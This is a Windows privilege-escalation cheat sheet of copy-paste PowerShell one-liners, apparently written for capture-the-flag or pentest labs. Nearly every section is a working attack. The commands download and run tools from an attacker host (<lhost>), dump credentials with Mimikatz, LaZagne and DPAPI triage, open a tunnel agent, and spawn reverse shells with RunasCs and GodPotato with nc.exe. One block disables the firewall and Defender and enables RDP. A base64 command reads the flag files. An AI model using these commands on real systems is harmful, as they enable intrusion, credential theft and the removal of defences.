# Windows Privilege Escalation
#target/local #os/windows #cat/privesc

## windows privesc enum
#ps_encode
```
&{cd (md <working_dir> -Force); (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | ForEach-Object { '{0} {1}' -f $_.ProductName, $_.LCUVer }|out-host); dir $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine;gci C:\ -force; netstat -ano|findstr LIST|out-host; tree C:\Users /a /f|out-host; whoami /all|out-host; (Get-MpComputerStatus|select AMServiceEnabled,RealTimeProtectionEnabled|out-host)}
```

## windows privesc all in one
#ps_encode
```
cd (md <working_dir> -f);(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | ForEach-Object { '{0} {1}' -f $_.ProductName, $_.LCUVer }|out-host);gci C:\ -force; netstat -ano|findstr LIST|out-host;tree C:\Users /a /f|out-host;whoami /all|out-host;(Get-MpComputerStatus|select AMServiceEnabled,RealTimeProtectionEnabled|out-host);iwr http://<lhost>:<lwport>/agent.exe -o agent.exe;start .\agent.exe -args '-connect <lhost>:<ligolo_port|11601> -retry -ignore-cert';iwr -uri http://<lhost>:<lwport>/dpapi_obf.exe -o dpapi_obf.exe;.\dpapi_obf.exe triage $(.\dpapi_obf.exe masterkeys /target:$env:APPDATA\Microsoft\Protect\$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /sid:$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /password:<password> | sls -Pattern '({[0-9A-Fa-f-]+}:[0-9A-F]+)' | % { $_.Matches[0].Value });iwr -uri http://<lhost>:<lwport>/LaZagne.exe -o LaZagne.exe;.\LaZagne.exe all -v;iwr -uri http://<lhost>:<lwport>/winPEASany.exe -o winPEASany.exe;.\winPEASany.exe;iex((new-object net.webclient).downloadstring('http://<lhost>:<lwport>/Invoke-RunasCs.ps1'));Invoke-RunasCs x x qwinsta -l 9;iex((new-object net.webclient).downloadstring('http://<lhost>:<lwport>/PrivescCheck.ps1'));Invoke-PrivescCheck
```

## mimikatz
#ps_encode
```
cd (md <working_dir> -Force);iex((New-Object Net.WebClient).DownloadString('http://<lhost>:<lwport>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords sekurlsa::ekeys token::elevate lsadump::sam lsadump::secrets token::revert exit'|oh;[regex]::Matches((gc .\mimikatz.log -Raw),'(?ms)\*\s+Username\s+:\s+(?''user''\S+)\s*\r?\n\s+\*\s+Domain\s+:\s+(?''domain''\S+)\s*\r?\n\s+\*\s+NTLM\s+:\s+(?''ntlm''\S+)')|% {[PSCustomObject]@{user=$_.Groups['user'].Value;domain=$_.Groups['domain'].Value;ntlm=$_.Groups['ntlm'].Value}}|ft -a
```

## ligolo windows agent
```
powershell -c "cd (md <working_dir> -f);iwr http://<lhost>:<lwport>/agent.exe -o agent.exe;start .\agent.exe -args '-connect <lhost>:<ligolo_port|11601> -retry -ignore-cert'"
```

## sharphound
```
powershell -c "cd (md <working_dir> -f);iwr -uri http://<lhost>:<lwport>/SharpHound.exe -o SharpHound.exe;.\SharpHound.exe -c All -s"
```

## lazagne
```
powershell -c "cd (md <working_dir> -f);iwr -uri http://<lhost>:<lwport>/LaZagne.exe -o LaZagne.exe;.\LaZagne.exe all -v"
```

## privesccheck
```
powershell -c "iex((new-object net.webclient).downloadstring('http://<lhost>:<lwport>/PrivescCheck.ps1'));Invoke-PrivescCheck"
```

## dpapi
#ps_encode
```
cd (md <working_dir> -f);iwr -uri http://<lhost>:<lwport>/dpapi_obf.exe -o dpapi_obf.exe;.\dpapi_obf.exe triage $(.\dpapi_obf.exe masterkeys /target:$env:APPDATA\Microsoft\Protect\$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /sid:$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /password:<password> | sls -Pattern '({[0-9A-Fa-f-]+}:[0-9A-F]+)' | % { $_.Matches[0].Value })
```

## winpeas
```
powershell -c "cd (md <working_dir> -f);iwr -uri http://<lhost>:<lwport>/winPEASany.exe -o winPEASany.exe;.\winPEASany.exe"
```

## runascs (non-encoded)
```
iex((new-object net.webclient).downloadstring('http://<lhost>:<lwport>/Invoke-RunasCs.ps1'));Invoke-RunasCs x x qwinsta -l 9
```

## runascs new credential reverse shell
#ps_encode
```
iex((new-object net.webclient).downloadstring('http://<lhost>:<lwport>/Invoke-RunasCs.ps1'));Invoke-RunasCs '<user>' <password> -Domain <domain> -Remote <lhost>:<lport|9001> powershell -l 8
```

## runascs
#ps_encode
```
iex((new-object net.webclient).downloadstring('http://<lhost>:<lwport>/Invoke-RunasCs.ps1'));Invoke-RunasCs x x qwinsta -l 9
```

## godpotato
```
powershell -c "cd (md <working_dir> -f);iwr -uri http://<lhost>:<lwport>/GodPotato.exe -o GodPotato.exe;iwr -uri http://<lhost>:<lwport>/nc.exe -o nc.exe;.\GodPotato.exe -cmd '<working_dir>\nc.exe <lhost> <lport> -e powershell.exe'"
```

## windows persistence (disable av/firewall, enable rdp)
#ps_encode
```
&{netsh advfirewall set allprofiles state off;reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v 'fDenyTSConnections' /t REG_DWORD /d 0 /f;Set-MpPreference -DisableRealtimeMonitoring 1}
```

## windows local flags
```
powershell -e ZABpAHIAIABDADoAXABVAHMAZQByAHMAIAAtAE4AYQBtAGUAfAAlAHsAdAB5AHAAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABfAFwARABlAHMAawB0AG8AcABcAHUAcwBlAHIALgB0AHgAdAAiACAAMgA+ACQAbgB1AGwAbAB9ADsAdAB5AHAAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABEAGUAcwBrAHQAbwBwAFwAcgBvAG8AdAAuAHQAeAB0ACAAMgA+ACQAbgB1AGwAbAA=
```

- working_dir
C:\Windows\Tasks
C:\Windows\System32\Tasks
